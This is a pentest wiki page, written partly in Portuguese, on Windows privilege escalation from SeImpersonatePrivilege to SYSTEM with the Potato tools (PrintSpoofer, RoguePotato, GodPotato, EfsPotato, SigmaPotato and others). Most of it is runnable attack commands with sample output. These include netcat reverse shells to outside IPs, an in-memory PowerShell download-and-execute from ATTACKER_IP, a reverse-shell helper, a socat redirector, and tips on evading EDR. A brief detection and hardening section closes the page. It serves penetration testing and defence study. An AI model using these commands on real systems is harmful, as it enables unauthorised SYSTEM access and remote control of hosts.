# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisitos e armadilhas comuns

Todas as técnicas a seguir dependem de abusar de um serviço privilegiado com capacidade de impersonation a partir de um contexto que detenha qualquer um destes privilégios:

- SeImpersonatePrivilege (o mais comum) ou SeAssignPrimaryTokenPrivilege
- Integridade elevada não é necessária se o token já tiver SeImpersonatePrivilege (típico para muitas contas de serviço como IIS AppPool, MSSQL, etc.)

Verifique privilégios rapidamente:
```cmd
whoami /priv | findstr /i impersonate
```
Notas operacionais:

- PrintSpoofer requer o serviço Print Spooler em execução e acessível pelo endpoint RPC local (spoolss). Em ambientes endurecidos onde o Spooler foi desativado após o PrintNightmare, prefira RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requer um OXID resolver acessível via TCP/135. Se o egress estiver bloqueado, use um redirector/port-forwarder (veja o exemplo abaixo). Builds mais antigas precisavam da flag -f.
- EfsPotato/SharpEfsPotato abusam de MS-EFSR; se um pipe estiver bloqueado, tente pipes alternativos (lsarpc, efsrpc, samr, lsass, netlogon).
- O erro 0x6d3 durante RpcBindingSetAuthInfo geralmente indica um serviço de autenticação RPC desconhecido/não suportado; tente outro pipe/transporte ou verifique se o serviço alvo está em execução.

## Demonstração Rápida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notas:
- Você pode usar -i para iniciar um processo interativo no console atual, ou -c para executar um comando de uma linha.
- Requer o serviço Spooler. Se estiver desativado, isso falhará.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Se a porta 135 de saída estiver bloqueada, pivot o OXID resolver via socat no seu redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Dica: Se um pipe falhar ou o EDR o bloquear, tente os outros pipes suportados:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notes:
- Funciona no Windows 8/8.1–11 e Server 2012–2022 quando SeImpersonatePrivilege está presente.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fornece duas variantes que miram objetos DCOM de serviço que por padrão usam RPC_C_IMP_LEVEL_IMPERSONATE. Compile ou use os binaries fornecidos e execute seu comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork do GodPotato atualizado)

SigmaPotato adiciona melhorias modernas, como execução em memória via .NET reflection e um PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Notas de detecção e endurecimento

- Monitore processos que criam named pipes e imediatamente chamam token-duplication APIs seguidas por CreateProcessAsUser/CreateProcessWithTokenW. O Sysmon pode revelar telemetria útil: Event ID 1 (criação de processo), 17/18 (named pipe criado/conectado) e linhas de comando que geram processos filhos como SYSTEM.
- Endurecimento do Spooler: Desabilitar o serviço Print Spooler em servidores onde não é necessário impede coerções locais do tipo PrintSpoofer via spoolss.
- Endurecimento de contas de serviço: Minimize a atribuição de SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege a serviços customizados. Considere executar serviços sob contas virtuais com os privilégios mínimos necessários e isolá-los com service SID e write-restricted tokens quando possível.
- Controles de rede: Bloquear TCP/135 de saída ou restringir o tráfego do RPC endpoint mapper pode quebrar o RoguePotato, a menos que um redirecionador interno esteja disponível.
- EDR/AV: Todas essas ferramentas são amplamente signatured. Recompilar a partir do source, renomear símbolos/strings ou usar execução em memória pode reduzir a detecção, mas não derrotará detecções comportamentais sólidas.

## Referências

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
